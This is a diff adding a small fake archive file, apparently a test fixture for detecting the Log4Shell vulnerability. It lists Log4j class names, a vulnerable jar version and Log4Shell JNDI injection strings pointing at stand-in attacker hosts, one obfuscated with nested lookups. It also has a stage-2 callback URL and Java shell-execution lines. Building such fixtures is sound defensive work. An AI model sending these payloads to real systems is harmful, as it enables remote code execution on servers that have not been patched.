@@ -1,0 +1,11 @@
+PKfake-zip-header
+META-INF/MANIFEST.MF
+Main-Class: com.example.App
+org.apache.logging.log4j.core.lookup.JndiLookup
+JndiLookup.class
+log4j-core-2.14.1.jar
+${jndi:ldap://attacker.example.com/exploit}
+${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.com/a}
+http://callback.evil.com:8888/stage2
+Runtime.getRuntime().exec(cmd)
+ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", payload);
